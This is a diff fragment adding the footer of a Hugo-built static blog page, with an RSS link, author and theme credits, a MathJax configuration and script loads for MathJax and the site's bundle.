+            <span> <a href="/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/st0n3">st0n3</a></span>
+            <span>Based on <a href="https://github.com/rhazdon">rhazdon</a></span>
+        </div>
+    </div>
+
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      extensions: ["tex2jax.js"],
+      
+      jax: ["input/TeX", "output/CommonHTML"],
+      tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+        displayMath: [ ['$$','$$'], ["\\[","\\]"] ],
+        processEscapes: true
+      },
+      "HTML-CSS": { fonts: ["TeX"] },
+      displayAlign: "left"
+    });
+  </script>
+
+<script async src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS-MML_CHTML"></script>
+
+
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.4c3fb12a087ceed4a52cb5d57068a9795c7069617a01ca70f788052ad66e1791779e6c72686e1dc0ca13dc03b0203204b6566bb0dd1ee80de2b7ff4d8fe53db2.js" integrity="sha512-TD&#43;xKgh87tSlLLXVcGipeVxwaWF6Acpw94gFKtZuF5F3nmxyaG4dwMoT3AOwIDIEtlZrsN0e6A3it/9Nj&#43;U9sg=="></script>
+
+
+
+    </body>
+</html>
